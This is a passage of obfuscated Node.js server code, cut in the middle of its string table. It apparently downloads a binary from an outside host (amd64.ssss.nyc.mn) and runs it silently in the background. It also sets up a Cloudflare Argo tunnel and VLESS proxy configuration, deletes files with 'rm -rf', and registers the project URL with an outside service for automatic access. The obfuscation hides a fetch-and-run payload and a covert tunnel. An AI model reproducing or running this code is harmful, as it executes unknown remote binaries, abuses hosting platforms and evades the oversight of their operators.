8','includes','has','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ARGO_DOMAIN:','test','2053','PROJECT_URL','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','apply','listen','\x20already\x20exists','web\x20running\x20error:\x20','error','config.json','ARGO_AUTH','tls','Empowerment\x20failed\x20for\x20','\x20-s\x20','filter','application/json','constructor','https://amd64.ssss.nyc.mn/web','UPLOAD_URL','toString','.exe\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','\x0a\x20\x20\x20\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/vless-argo','rm\x20-rf\x20','FILE_PATH','20466504VIkHwu'];_0x1854=function(){return _0x2510d9;};return _0x1854();}cleanFiles();async function AddVisitTask(){const _0x2b7dce=_0x444a2e;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x2b7dce(0x137));return;}try{const _0x31a7c7=await axios[_0x2b7dce(0x1be)](_0x2b7dce(0x1c9),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2b7dce(0x17b)}});return console[_0x2b7dce(0x15f)](_0x2b7dce(0x1c5)),_0x31a7c7;}catch(_0x2ecdb7){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2ecdb7[_0x2b7dce(0x1cb)]),null;}}async function startserver(){try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x111272){console['error']('Error\x20in\x20startserver:',_0x111272);}}startserver()[_0x444a2e(0x142)](_0x200402=>{const _0x5af2a2=_0x444a2e;console[_0x5af2a2(0x174)](_0x5af2a2(0x1a7),_0x200402);}),app[_0x444a2e(0x171)](PORT,()=>console[_0x444a2e(0x15f)](_0x444a2e(0x144)+PORT+'!'));
